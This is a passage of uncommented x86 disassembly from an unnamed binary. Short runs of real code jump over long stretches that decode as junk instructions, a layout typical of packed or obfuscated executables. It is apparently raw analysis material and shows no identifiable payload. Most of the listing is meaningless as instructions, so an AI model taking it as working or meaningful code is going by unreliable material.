  401912:	add    eax,edi
  401914:	mov    DWORD PTR [ecx],eax
  401916:	mov    eax,DWORD PTR [ebp-0x10]
  401919:	mov    ecx,DWORD PTR [ebp+0x10]
  40191c:	jmp    0x401c22
  401921:	xor    eax,0x752ed85c
  401926:	stos   BYTE PTR es:[edi],al
  401927:	cmc    
  401928:	pop    ebx
  401929:	push   eax
  40192a:	mov    bh,0xe1
  40192c:	retf   
  40192d:	push   eax
  40192e:	(bad)  
  40192f:	call   0x677c:0x7c7b4e5a
  401936:	jle    0x4019b4
  401938:	jl     0x401904
  40193a:	add    DWORD PTR [esi+esi*1],ebp
  40193d:	out    dx,al
  40193e:	xchg   edi,eax
  40193f:	cmp    BYTE PTR [edx-0x50],bh
  401942:	cmp    al,0x9
  401944:	inc    ebx
  401945:	xchg   ecx,eax
  401946:	lods   eax,DWORD PTR ds:[esi]
  401947:	fidivr WORD PTR [esi+0x6c7f3dbe]
  40194d:	stc    
  40194e:	mov    esi,0x2a8b1c96
  401953:	mov    bh,0x65
  401955:	adc    eax,0x804d0ec1
  40195a:	ins    BYTE PTR es:[edi],dx
  40195b:	popf   
  40195c:	aas    
  40195d:	push   ebp
  40195e:	dec    eax
  40195f:	out    0x5b,al
  401961:	mov    dh,0x56
  401963:	scas   al,BYTE PTR es:[edi]
  401964:	fisubr WORD PTR ss:[edi+0x6b]
  401968:	dec    ecx
  401969:	pop    ebx
  40196a:	das    
  40196b:	sar    BYTE PTR [ebx+0x7d],1
  40196e:	mov    fs,WORD PTR [ecx-0x66e8f67d]
  401974:	or     esi,esp
  401976:	(bad)  
  401977:	jmp    0x4019d0
  401979:	retf   0x427d
  40197c:	stc    
  40197d:	jnp    0x4019cf
  40197f:	into   
  401980:	lahf   
  401981:	push   ebx
  401982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401983:	jp     0x401948
  401985:	cmp    al,0xfa
  401987:	imul   edi,DWORD PTR [esi+0x52],0x577ca0ad
  40198e:	icebp  
  40198f:	dec    esp
  401990:	shl    DWORD PTR [edx-0x26e55041],1
  401996:	cmp    BYTE PTR [edx+0x170312d2],cl
  40199c:	sbb    bl,bh
  40199e:	push   ecx
  40199f:	lock mov ch,0x57
  4019a2:	popa   
  4019a3:	dec    ebp
  4019a4:	mov    BYTE PTR [esi-0x24],cl
  4019a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019a8:	or     al,0x9c
  4019aa:	loop   0x401a0c
  4019ac:	daa    
  4019ad:	inc    edi
  4019ae:	rol    ebx,cl
  4019b0:	ins    BYTE PTR es:[edi],dx
  4019b1:	cld    
  4019b2:	push   0xffffffea
  4019b4:	sbb    DWORD PTR [edi+eiz*2+0x370d39e1],0xc727df9
  4019bf:	mov    ebp,0x67f94732
  4019c4:	xor    al,0x79
  4019c6:	retf   0xbbde
  4019c9:	in     al,dx
  4019ca:	sbb    al,0x5c
  4019cc:	xchg   BYTE PTR [esi-0x1f],ch
  4019cf:	xor    eax,0x31e888f6
  4019d4:	inc    esp
  4019d5:	popf   
  4019d6:	or     al,0x92
  4019d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019d9:	xchg   DWORD PTR [ebx-0x7eb1d317],ebx
  4019df:	jae    0x401a05
  4019e1:	enter  0xdad0,0xee
  4019e5:	mov    ebx,DWORD PTR [esi+0x4d]
  4019e8:	mov    dl,0x40
  4019ea:	ss sahf 
  4019ec:	cmp    ecx,edi
  4019ee:	push   ds
  4019ef:	dec    edx
  4019f0:	pop    ebp
  4019f1:	pop    eax
  4019f2:	(bad)  
  4019f3:	in     al,dx
  4019f4:	retf   
  4019f5:	push   edi
  4019f6:	xor    DWORD PTR [edx-0x2b74858d],ecx
  4019fc:	inc    eax
  4019fd:	ss and eax,0xd9efe700
  401a03:	cdq    
  401a04:	adc    al,0xdf
  401a06:	leave  
  401a07:	test   BYTE PTR [ecx],0x51
  401a0a:	inc    esp
  401a0b:	mov    ebp,0x9b9493e8
  401a10:	cmp    al,0x67
  401a12:	xchg   esi,eax
  401a13:	pop    ebx
  401a14:	cwde   
  401a15:	sub    BYTE PTR [ecx-0x3f9551db],dh
  401a1b:	jle    0x4019c6
  401a1d:	scas   eax,DWORD PTR es:[edi]
  401a1e:	outs   dx,DWORD PTR ds:[esi]
  401a1f:	daa    
  401a20:	push   ss
  401a21:	sub    bh,BYTE PTR [ecx+edi*2]
  401a24:	add    al,al
  401a26:	imul   ebx,DWORD PTR [ebx-0x4b],0x2c
  401a2a:	jmp    FWORD PTR ds:[edi+0x0]
  401a2e:	jb     0x401a74
  401a30:	xlat   BYTE PTR ds:[ebx]
  401a31:	fs jecxz 0x401a98
  401a34:	add    esi,eax
  401a36:	sar    cl,cl
  401a38:	outs   dx,BYTE PTR ds:[esi]
  401a39:	(bad)  
  401a3a:	jecxz  0x4019e7
  401a3c:	or     esp,esp
  401a3e:	xchg   edx,eax
  401a3f:	cmp    BYTE PTR [ecx+0x75],al
  401a42:	adc    DWORD PTR ds:[esi+0x36bd0bbe],esp
  401a49:	enter  0x2adf,0x4
  401a4d:	xlat   BYTE PTR ds:[ebx]
  401a4e:	adc    eax,0xa5766a71
  401a53:	popf   
  401a54:	mov    dh,0xea
  401a56:	sub    eax,0x407fd115
  401a5b:	leave  
  401a5c:	idiv   BYTE PTR [ebx-0x76]
  401a5f:	idiv   DWORD PTR [ecx]
  401a61:	js     0x401aa8
  401a63:	dec    esp
  401a64:	mov    ah,0xb3
  401a66:	add    DWORD PTR [edx+0x7a],eax
  401a69:	cmp    edi,DWORD PTR [ebx+0x59d347a0]
  401a6f:	aaa    
  401a70:	sub    esi,edi
  401a72:	(bad)  
  401a73:	in     al,dx
  401a74:	fadd   DWORD PTR [ecx+0x27]
  401a77:	adc    DWORD PTR [edi],0x63455710
  401a7d:	sub    eax,0xe06f4882
  401a82:	lods   eax,DWORD PTR ds:[esi]
  401a83:	dec    esi
  401a84:	push   cs
  401a85:	out    dx,eax
  401a86:	fld    QWORD PTR ds:0xa4c0917e
  401a8c:	mov    dl,cl
  401a8e:	in     eax,0x4c
  401a90:	lods   al,BYTE PTR ds:[esi]
  401a91:	xchg   esp,eax
  401a92:	mov    bh,0x3e
  401a94:	jg     0x401a49
  401a96:	clc    
  401a97:	adc    al,0x12
  401a99:	cmp    eax,0x5cbecccc
  401a9e:	cdq    
  401a9f:	or     ch,BYTE PTR [ecx]
  401aa1:	mov    ch,0x4f
  401aa3:	int3   
  401aa4:	xor    DWORD PTR [esi+0x5e],ecx
  401aa7:	push   cs
  401aa8:	jbe    0x401a5b
  401aaa:	cmc    
  401aab:	mov    esp,esi
  401aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401aae:	dec    ebp
  401aaf:	sub    bl,BYTE PTR [eax+0x39]
  401ab2:	push   0xbedb1920
  401ab7:	pusha  
  401ab8:	cmp    DWORD PTR [esp+ecx*8+0x4c500bd7],ebx
  401abf:	inc    sp
  401ac1:	rcl    BYTE PTR [ecx],0x39
  401ac4:	call   0x6a5f:0x10185d7d
  401acb:	out    0xdf,eax
  401acd:	nop
  401ace:	mov    ebx,DWORD PTR [ebp+eiz*1-0x3c]
  401ad2:	xchg   ebx,eax
  401ad3:	fimul  WORD PTR [edx+0x7]
  401ad6:	mov    ch,0xb2
  401ad8:	push   0x22
  401ada:	dec    ecx
  401adb:	stc    
  401adc:	je     0x401b2c
  401ade:	pushf  
  401adf:	aam    0x5d
  401ae1:	ins    DWORD PTR es:[edi],dx
  401ae2:	int3   
  401ae3:	and    ch,0x99
  401ae6:	dec    edi
  401ae7:	sbb    eax,0xb98ef956
  401aec:	push   0x33
  401aee:	xchg   edi,eax
  401aef:	ins    DWORD PTR es:[edi],dx
  401af0:	inc    edx
  401af1:	outs   dx,BYTE PTR ds:[esi]
  401af2:	stos   BYTE PTR es:[edi],al
  401af3:	adc    BYTE PTR [ebx],0x1b
  401af6:	sbb    eax,0xdfeb1dd9
  401afb:	push   ecx
  401afc:	lods   al,BYTE PTR ds:[esi]
  401afd:	inc    edi
  401afe:	pop    edx
  401aff:	popf   
  401b00:	pop    ebx
  401b01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b02:	xchg   ebp,eax
  401b03:	and    cl,cl
  401b05:	dec    edi
  401b06:	jmp    0x401b67
  401b08:	add    al,0x61
  401b0a:	adc    BYTE PTR [edi-0x30],bh
  401b0d:	test   DWORD PTR [edx+ebx*1+0x7daaf355],edi
  401b14:	pop    eax
  401b15:	pushf  
  401b16:	xchg   BYTE PTR [ebx],ah
  401b18:	add    al,0x7
  401b1a:	ror    DWORD PTR [eax+0x3e],cl
  401b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b1e:	mov    WORD PTR [eax+0x38],fs
  401b21:	jmp    0x401b37
  401b23:	cld    
  401b24:	js     0x401b20
  401b26:	jle    0xcba67547
  401b2c:	xor    edi,eax
  401b2e:	xchg   esp,eax
  401b2f:	sbb    al,0x3a
  401b31:	ss pop eax
  401b33:	mov    ds,WORD PTR [edx]
  401b35:	pop    edi
  401b36:	loop   0x401afb
  401b38:	pusha  
  401b39:	push   eax
  401b3a:	pop    eax
  401b3b:	fbld   TBYTE PTR [ebp+ecx*1+0x67]
  401b3f:	xor    al,0xfb
  401b41:	jmp    0x2aef3d4e
  401b46:	jo     0x401b0a
  401b48:	and    al,ch
  401b4a:	fstp   DWORD PTR [esi]
  401b4c:	(bad)  [edi]
  401b4e:	out    dx,al
  401b4f:	push   esp
  401b50:	fmul   DWORD PTR [eax]
  401b52:	push   esi
  401b53:	enter  0x43c9,0xe2
  401b57:	jecxz  0x401b10
  401b59:	mov    esp,0xcc547102
  401b5e:	pop    ss
  401b5f:	std    
  401b60:	jecxz  0x401bb7
  401b62:	mov    BYTE PTR [esi],ah
  401b64:	or     DWORD PTR [esi],0xb7d72080
  401b6a:	clc    
  401b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b6c:	sub    eax,DWORD PTR [edi]
  401b6e:	jo     0x401b94
  401b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b71:	cld    
  401b72:	mov    fs,WORD PTR [ebx+0x36]
  401b75:	push   ebp
  401b76:	cmp    al,0x9f
  401b78:	cld    
  401b79:	cmc    
  401b7a:	addr16 aaa 
  401b7c:	rcr    BYTE PTR [ecx+0x3c],cl
  401b7f:	xor    edi,ecx
  401b81:	inc    ebx
  401b82:	lods   eax,DWORD PTR ds:[esi]
  401b83:	pop    edi
  401b84:	jmp    0x6e10:0x27152432
  401b8b:	xchg   DWORD PTR [eax*1-0x1860d9cc],esi
  401b92:	mov    ebx,0x4dbc08b1
  401b97:	leave  
  401b98:	xor    BYTE PTR [ecx+0x10],bh
  401b9b:	or     esp,edi
  401b9d:	dec    edi
  401b9e:	add    edi,DWORD PTR [edx-0x22]
  401ba1:	mov    ebx,DWORD PTR [esi]
  401ba3:	jno    0x401b80
  401ba5:	or     ecx,0xa3b83b8d
  401bab:	das    
  401bac:	cdq    
  401bad:	dec    edx
  401bae:	push   edx
  401baf:	cmp    BYTE PTR [ecx],0x1f
  401bb2:	ins    DWORD PTR es:[edi],dx
  401bb3:	push   ss
  401bb4:	push   cs
  401bb5:	pop    edx
  401bb6:	fist   WORD PTR [ebx]
  401bb8:	mov    ds:0x52c31b83,eax
  401bbd:	cmp    BYTE PTR [ebx-0x53],dl
  401bc0:	jg     0x401c19
  401bc2:	mov    esi,0x6a590f54
  401bc7:	adc    dl,bl
  401bc9:	ds pop ss
  401bcb:	sbb    ebp,edi
  401bcd:	and    eax,DWORD PTR [edi]
  401bcf:	loopne 0x401bee
  401bd1:	cmp    eax,edi
  401bd3:	aam    0x5f
  401bd5:	call   0xdbec0848
  401bda:	into   
  401bdb:	jge    0x401bbd
  401bdd:	sub    dl,dh
  401bdf:	ret    
  401be0:	mov    ds:0x2682613a,eax
  401be5:	sbb    DWORD PTR [edx-0x3a36e7ba],0x55213bcf
  401bef:	test   eax,0x8e23c0e0
  401bf4:	mov    edx,0x6c0deec1
  401bf9:	punpcklbw mm4,mm7
  401bfc:	pop    ds
  401bfd:	dec    edi
  401bfe:	cli    
  401bff:	je     0x401bb7
  401c01:	jmp    0x699c:0x71dfaf07
  401c08:	jb     0x401bf8
  401c0a:	call   0xcf80:0xb81b7f15
  401c11:	ret    0x6942
  401c14:	add    eax,0x8efc77f3
  401c19:	cmp    bl,BYTE PTR [esi]
  401c1b:	add    ah,BYTE PTR [ebx]
  401c1d:	xor    eax,0x21cf0941
  401c22:	xor    ecx,esi
  401c24:	mov    edx,0xffcd8d66
  401c29:	sub    edx,ecx
  401c2b:	add    DWORD PTR [eax],edx
  401c2d:	jmp    0x401f33
  401c32:	call   0xbda4cdad
  401c37:	addr16 cmc 
  401c39:	jb     0x401c6b
  401c3b:	popa   
  401c3c:	xchg   ecx,eax
  401c3d:	and    eax,0x4ca25b9c
  401c42:	mov    cl,0x4
  401c44:	jl     0x401cc2
  401c46:	addr16 jle 0x401cc5
  401c49:	jl     0x401c59
  401c4b:	mov    DWORD PTR [edx],edx
  401c4d:	sar    BYTE PTR [eax],0x60
  401c50:	sub    eax,0x3e0f513c
  401c55:	xchg   esp,eax
  401c56:	sti    
  401c57:	mov    WORD PTR [ebp+0x4b6e43e6],gs
  401c5d:	push   ss
  401c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c5f:	mov    bl,0x3e
  401c61:	inc    esi
  401c62:	ds retf 0xa1ee
  401c66:	scas   eax,DWORD PTR es:[edi]
  401c67:	sbb    eax,0xddc1710c
  401c6c:	loope  0x401cab
  401c6e:	outs   dx,BYTE PTR ds:[esi]
  401c6f:	int3   
  401c70:	or     dl,BYTE PTR [ebp-0x7e]
  401c73:	xor    dl,BYTE PTR [edi+0x749dc267]
  401c79:	or     DWORD PTR [esi+0x2d0c736b],0x62
  401c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c81:	jne    0x401cbc
  401c83:	dec    edi
  401c84:	cs cmp ebp,ebx
  401c87:	adc    cl,BYTE PTR [ebx]
  401c89:	mov    WORD PTR [ebx+0x59d604e7],ds
  401c8f:	cdq    
  401c90:	popf   
  401c91:	ret    
  401c92:	and    DWORD PTR [edi-0x11accbe7],esi
  401c98:	jl     0x401c69
  401c9a:	rcr    BYTE PTR [eax+0x53],cl
  401c9d:	jmp    0xa304:0xcf323c5b
  401ca4:	pushf  
  401ca5:	popf   
  401ca6:	add    eax,0xcd88aed1
  401cab:	xchg   DWORD PTR [edi],eax
  401cad:	ret    
  401cae:	mov    dl,0x6a
  401cb0:	loope  0x401cd3
  401cb2:	xlat   BYTE PTR ds:[ebx]
  401cb3:	retf   
  401cb4:	sub    BYTE PTR [esp+ecx*4-0x1],0xf0
  401cb9:	pop    esi
  401cba:	les    esi,FWORD PTR [ebx-0x5d]
  401cbd:	and    BYTE PTR [eax],cl
  401cbf:	xchg   ebx,eax
  401cc0:	clc    
  401cc1:	adc    eax,0x5222309c
  401cc6:	and    cl,BYTE PTR [ebp-0x56]
  401cc9:	daa    
  401cca:	aaa    
  401ccb:	outs   dx,BYTE PTR ds:[esi]
  401ccc:	outs   dx,BYTE PTR ds:[esi]
  401ccd:	shl    eax,cl
  401ccf:	inc    edi
  401cd0:	xchg   edi,eax
  401cd1:	call   0x3dca233
  401cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd7:	in     eax,0xea
  401cd9:	enter  0xf9b1,0xe6
  401cdd:	xor    al,0xa0
  401cdf:	pop    eax
  401ce0:	pop    ecx
  401ce1:	inc    ecx
  401ce2:	mov    cl,0xcf
  401ce4:	dec    ebx
  401ce5:	(bad)  
  401ce6:	daa    
  401ce7:	sub    BYTE PTR [esi-0x35],bh
  401cea:	mov    cl,0x5f
  401cec:	adc    dl,BYTE PTR [ecx+0x62]
  401cef:	aaa    
  401cf0:	rol    DWORD PTR [edx+0x50],0xac
  401cf4:	add    ebp,0x38
  401cf7:	sub    eax,0xf67d595e
  401cfc:	and    eax,0xf4205ea2
  401d01:	pop    es
  401d02:	and    BYTE PTR ds:0x4b6d0041,ah
  401d08:	aaa    
  401d09:	pop    edi
  401d0a:	inc    edi
  401d0b:	jno    0x401cff
  401d0d:	push   0x3c
  401d0f:	cmp    al,0x8
  401d11:	inc    edx
  401d12:	add    eax,0x25b8b3a0
  401d17:	adc    al,0x7c
  401d19:	fdivr  QWORD PTR [edx]
  401d1b:	lds    edi,FWORD PTR [ecx+0x49]
  401d1e:	add    ah,dl
  401d20:	or     dl,BYTE PTR ds:0xf72bf7ec
  401d26:	push   ecx
  401d27:	pop    edx
  401d28:	sbb    eax,0x8c426552
  401d2d:	inc    edi
  401d2e:	cdq    
  401d2f:	and    ebx,DWORD PTR [esi+ebx*2-0x33]
  401d33:	ins    DWORD PTR es:[edi],dx
  401d34:	mov    esi,0xe732d56
  401d39:	add    BYTE PTR [eax],dl
  401d3b:	sub    DWORD PTR [esi-0xe],eax
  401d3e:	(bad)  
  401d3f:	popa   
  401d40:	bound  ebx,QWORD PTR [edx+0x68002675]
  401d46:	nop
  401d47:	mov    ds:0x6b761d9,al
  401d4c:	pop    eax
  401d4d:	mov    eax,es:0x16392e21
  401d53:	mov    ah,dl
  401d55:	add    dh,bh
  401d57:	es mov ch,0x88
  401d5a:	add    edx,DWORD PTR [edi]
  401d5c:	jb     0x401da3
  401d5e:	fwait
  401d5f:	lods   eax,DWORD PTR ds:[esi]
  401d60:	(bad)  
  401d61:	and    al,0x6e
  401d63:	push   0x39475d11
  401d68:	add    DWORD PTR [eax],esi
  401d6a:	jmp    0x401d86
  401d6c:	push   esp
  401d6d:	hlt    
  401d6e:	arpl   WORD PTR [edx+0xa],bp
  401d71:	rol    DWORD PTR [ebp-0x2c],cl
  401d74:	mov    bl,0xc7
  401d76:	mov    ebx,0x8dcd3a16
  401d7b:	ret    
  401d7c:	dec    eax
  401d7d:	xlat   BYTE PTR ds:[ebx]
  401d7e:	xor    eax,0xb5abfd62
  401d83:	loope  0x401d7f
  401d85:	call   0x885c:0x1ff718a8
  401d8c:	in     al,dx
  401d8d:	outs   dx,BYTE PTR ds:[esi]
  401d8e:	jns    0x401de7
  401d90:	mov    eax,ds:0x1d8b8f3f
  401d95:	jge    0x401d59
  401d97:	fiadd  DWORD PTR [eax-0x10]
  401d9a:	(bad)  
  401d9b:	or     ecx,eax
  401d9d:	outs   dx,DWORD PTR ds:[esi]
  401d9e:	sar    al,0x2e
  401da1:	sub    eax,0xaba7762f
  401da6:	xchg   edi,eax
  401da7:	pop    ss
  401da8:	mov    dl,0x86
  401daa:	fsub   DWORD PTR [edx+0x7680af6b]
  401db0:	sahf   
  401db1:	repz xlat BYTE PTR ds:[ebx]
  401db3:	(bad)  
  401db4:	in     al,dx
  401db5:	and    bl,BYTE PTR ds:0xf73631e3
  401dbb:	arpl   WORD PTR [ebp+0x3f],dx
  401dbe:	pushf  
  401dbf:	cmc    
  401dc0:	xchg   edi,eax
  401dc1:	gs in  eax,dx
  401dc3:	mov    BYTE PTR [ebp+0x26],ah
  401dc6:	sbb    BYTE PTR [edx-0x14],cl
  401dc9:	(bad)  
  401dca:	cld    
  401dcb:	add    eax,0xc524af74
  401dd0:	stos   DWORD PTR es:[edi],eax
  401dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dd2:	pop    esp
  401dd3:	adc    esi,ebp
  401dd5:	xor    ebx,DWORD PTR [ecx+edx*8-0x48]
  401dd9:	ss xor edi,esp
  401ddc:	pop    edi
  401ddd:	neg    esi
  401ddf:	dec    ebx
  401de0:	pop    ebx
  401de1:	push   cs
  401de2:	leave  
  401de3:	iret   
  401de4:	sbb    ch,BYTE PTR [eax-0x76]
  401de7:	inc    eax
  401de8:	mov    eax,0xe9af486e
  401ded:	dec    ecx
  401dee:	fcomi  st,st(7)
  401df0:	repz sub al,0xb0
  401df3:	xor    al,0xdc
  401df5:	fsub   DWORD PTR [ecx+0x6ce67464]
  401dfb:	(bad)  
  401dfc:	repnz es mov ah,0xaa
  401e00:	sub    ecx,DWORD PTR [ebx]
  401e02:	push   esi
  401e03:	jbe    0x401dfc
  401e05:	mov    ch,0xb
  401e07:	push   eax
  401e08:	inc    esi
  401e09:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  401e0b:	scas   al,BYTE PTR es:[edi]
  401e0c:	lahf   
  401e0d:	mov    ch,dl
  401e0f:	aaa    
  401e10:	adc    DWORD PTR [ebp-0x63],eax
  401e13:	enter  0x9764,0xdb
  401e17:	pusha  
  401e18:	ja     0x401da8
  401e1a:	(bad)  
  401e1b:	js     0x401e88
  401e1d:	or     DWORD PTR [ecx],ecx
  401e1f:	cmp    esi,DWORD PTR [eax]
  401e21:	(bad)  
  401e22:	mov    ds:0x25a6c8f5,al
  401e27:	cmp    DWORD PTR [ebp-0x35],eax
  401e2a:	mov    al,0xb
  401e2c:	aad    0x35
  401e2e:	lea    esi,[esi]
  401e30:	pop    esp
  401e31:	(bad)  
  401e33:	add    eax,0x7ef899de
  401e38:	pop    es
  401e39:	sahf   
  401e3a:	aad    0x2a
  401e3c:	push   0x2a
  401e3e:	cdq    
  401e3f:	adc    al,0x40
  401e41:	jne    0x401dca
  401e43:	(bad)  
  401e45:	push   esi
  401e46:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  401e48:	inc    eax
  401e49:	(bad)  
  401e4a:	pop    ss
  401e4b:	xchg   esi,eax
  401e4c:	test   DWORD PTR [ecx+0x643e87ec],esp
  401e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e53:	pop    es
  401e54:	(bad)  
  401e55:	sub    DWORD PTR [edx],esp
  401e57:	shr    DWORD PTR [edx+0x66],cl
  401e5a:	jp     0x401e8f
  401e5c:	gs push esp
  401e5e:	fs push edi
  401e60:	or     al,0x36
  401e62:	out    0x94,eax
  401e64:	gs jmp 0x401e10
  401e67:	add    ebp,DWORD PTR [edi+0x22]
  401e6a:	mov    ecx,0xa7f8e5a8
  401e6f:	les    esi,FWORD PTR [ebp+edi*2+0x6de975a7]
  401e76:	sbb    dl,ch
  401e78:	adc    eax,DWORD PTR [eax]
  401e7a:	repnz add edi,DWORD PTR [esi+0xa]
  401e7e:	les    eax,FWORD PTR [ecx]
  401e80:	pushf  
  401e81:	sbb    al,ch
  401e83:	cmp    DWORD PTR [eax-0x4d],ebx
  401e86:	add    DWORD PTR [edi+0x1c],edi
  401e89:	sbb    dh,BYTE PTR [eax+ebp*1-0xc21c8e1]
  401e90:	mov    ebp,0x39c0c111
  401e95:	add    ebx,DWORD PTR [eax+0x48e12445]
  401e9b:	pop    edx
  401e9c:	pusha  
  401e9d:	jno    0x401ee7
  401e9f:	icebp  
  401ea0:	cs mov ch,0xc5
  401ea3:	xor    al,0x1
  401ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ea6:	cwde   
  401ea7:	outs   dx,DWORD PTR ds:[esi]
  401ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ea9:	sbb    edi,DWORD PTR [edi-0x2940b73d]
  401eaf:	mov    bh,0xcd
  401eb1:	xchg   edx,eax
  401eb2:	js     0x401e7e
  401eb4:	sbb    ch,BYTE PTR [ebx+ecx*2+0x41]
  401eb8:	mov    al,0xea
  401eba:	jo     0x401ea8
  401ebc:	int    0x92
  401ebe:	mov    esp,0xe89d6a48
  401ec3:	add    edx,esi
  401ec5:	sbb    dl,BYTE PTR [bp+0x4e21]
  401eca:	(bad)  
  401ecb:	sbb    esp,DWORD PTR [esi]
  401ecd:	sbb    cl,dh
  401ecf:	xlat   BYTE PTR ds:[ebx]
  401ed0:	jo     0x401eac
  401ed2:	jle    0x401eb6
  401ed4:	jecxz  0x401e6e
  401ed6:	jno    0x401f08
  401ed8:	push   ebp
  401ed9:	pushf  
  401eda:	jmp    0x8d0cd0e6
  401edf:	xchg   esp,eax
  401ee0:	jns    0x401ee9
  401ee2:	aas    
  401ee3:	pop    ss
  401ee4:	dec    ebp
  401ee5:	shr    ebp,0xcb
  401ee8:	stos   DWORD PTR es:[edi],eax
  401ee9:	jns    0x401efc
  401eeb:	and    al,0xcc
  401eed:	push   ebp
  401eee:	pop    eax
  401eef:	into   
  401ef0:	(bad)  
  401ef1:	add    edi,DWORD PTR [eax]
  401ef3:	push   ebp
  401ef4:	aad    0x7f
  401ef6:	jo     0x401e7a
  401ef8:	sar    ecx,cl
  401efa:	pop    edx
  401efb:	xchg   DWORD PTR [edi],ebp
  401efd:	and    eax,0x1b02c2a5
  401f02:	jno    0x401e97
  401f04:	fisttp QWORD PTR [ebx-0x6c01670e]
  401f0a:	add    ebx,edi
  401f0c:	in     eax,dx
  401f0d:	in     eax,0xa7
  401f0f:	ret    0x7a89
  401f12:	inc    esi
  401f13:	test   BYTE PTR [ecx-0x7d925ebe],0x44
  401f1a:	xor    DWORD PTR [eax-0x5f38d3be],0x2e
  401f21:	pop    ds
  401f22:	in     al,0x23
  401f24:	mov    eax,ds:0xb87fafef
  401f29:	dec    ebp
  401f2a:	aas    
  401f2b:	or     eax,0xdb01a63a
  401f30:	mov    cl,0x7e
  401f32:	or     BYTE PTR [ecx+0x413bea],ah
  401f38:	mov    eax,DWORD PTR [eax]
  401f3a:	mov    cx,WORD PTR [ebp-0x4]
  401f3e:	movzx  ecx,cx
  401f41:	add    ecx,DWORD PTR [eax]
  401f43:	mov    DWORD PTR [ebp-0x18],ecx
  401f46:	mov    eax,DWORD PTR [ebp+0xc]
  401f49:	jmp    0x40224f
  401f4e:	adc    BYTE PTR [ebx+0x52c9c8c9],0x8d
  401f55:	pop    ebp
  401f56:	and    DWORD PTR [ebp-0x67],0x3527b850
  401f5d:	scas   al,BYTE PTR es:[edi]
  401f5e:	cwde   
  401f5f:	add    DWORD PTR [esp+edi*2+0x67],edi
  401f63:	jle    0x401fe1
  401f65:	jl     0x401f1a
  401f67:	pop    esi
  401f68:	icebp  
  401f69:	cmp    DWORD PTR [ecx+0x2],eax
  401f6c:	(bad)  
  401f6d:	std    
  401f6e:	cwde   
  401f6f:	pusha  
  401f70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f71:	imul   eax,edi,0xffffffdd
  401f74:	xor    ah,ah
  401f76:	adc    eax,0x7f6dc50d
  401f7b:	dec    esp
  401f7c:	jp     0x401eff
  401f7e:	or     DWORD PTR [ebp-0x3b],ebx
  401f81:	neg    DWORD PTR [ebx+edi*4+0x2590089e]
  401f88:	or     eax,0x89563990
  401f8d:	leave  
  401f8e:	pushf  
  401f8f:	pop    eax
  401f90:	inc    eax
  401f91:	imul   esp,DWORD PTR [edx],0x345c3a5b
  401f97:	sbb    eax,0xbcfb236c
  401f9c:	sub    al,0x9b
  401f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f9f:	call   0xd531:0x858dd273
  401fa6:	add    eax,0xc7921abf
  401fab:	std    
  401fac:	gs jns 0x402022
  401faf:	clc    
  401fb0:	jp     0x401fa8
  401fb2:	enter  0x1b95,0x55
  401fb6:	(bad)  
  401fb7:	loope  0x402035
  401fb9:	jae    0x401ff0
  401fbb:	add    cl,BYTE PTR [ecx+esi*1+0x3b]
  401fbf:	add    bh,0xb0
  401fc2:	in     al,0x8a
  401fc4:	imul   ecx,DWORD PTR [eax+ecx*2-0xc],0x21214d11
  401fcc:	ins    DWORD PTR es:[edi],dx
  401fcd:	xor    BYTE PTR [ebx],dl
  401fcf:	js     0x401f7a
  401fd1:	sub    al,BYTE PTR ds:0xc2eda025
  401fd7:	ja     0x401fd9
  401fd9:	jle    0x402012
  401fdb:	rcl    BYTE PTR [edx-0x2178a978],cl
  401fe1:	jnp    0x401fb3
  401fe3:	inc    edi
  401fe4:	and    eax,0x938f5802
  401fe9:	push   eax
  401fea:	jne    0x402035
  401fec:	add    ah,BYTE PTR [ecx]
  401fee:	bound  edx,QWORD PTR [ebx-0x40]
  401ff1:	(bad)  
  401ff2:	push   ds
  401ff3:	inc    esp
  401ff4:	mov    DWORD PTR [edi-0x3ea9e627],edi
  401ffa:	icebp  
  401ffb:	jp     0x40201f
  401ffd:	addr16 pushf 
  401fff:	dec    ebx
  402000:	sbb    DWORD PTR [ecx],eax
  402002:	jle    0x40204e
  402004:	outs   dx,DWORD PTR ds:[esi]
  402005:	ret    
  402006:	js     0x402020
  402008:	test   eax,0x6631c9c0
  40200d:	jo     0x401ffd
  40200f:	ins    BYTE PTR es:[edi],dx
  402010:	mov    edi,0x19a0ffe
  402015:	and    ah,BYTE PTR [ebp-0x36]
  402018:	lock jns 0x401fc1
  40201b:	imul   BYTE PTR [edi]
  40201d:	in     eax,dx
  40201e:	cmp    edi,ecx
  402020:	xchg   edi,eax
  402021:	shr    BYTE PTR [edx],cl
  402023:	ret    0xd9ac
  402026:	lods   eax,DWORD PTR ds:[esi]
  402027:	call   0x6091a579
  40202c:	xor    BYTE PTR [eax+0x30fa48d7],al
  402032:	jo     0x401fcf
  402034:	sub    DWORD PTR ss:[eax+0x70],ecx
  402038:	mov    bh,0xa9
  40203a:	fnstsw WORD PTR [ebp+0x19468d3d]
  402040:	xchg   ebp,eax
  402041:	xchg   ebx,eax
  402043:	xchg   esp,eax
  402044:	sbb    eax,0xb783bc34
  402049:	push   ecx
  40204a:	sbb    DWORD PTR [eax+0x509db3c6],esp
  402050:	push   cs
  402051:	dec    esi
  402052:	scas   al,BYTE PTR es:[edi]
  402053:	cmp    bh,cl
  402055:	mov    eax,0x253deef7
  40205a:	mov    esp,0xd623443d
  40205f:	jmp    0x402057
  402061:	jmp    0x402080
  402063:	add    al,0x49
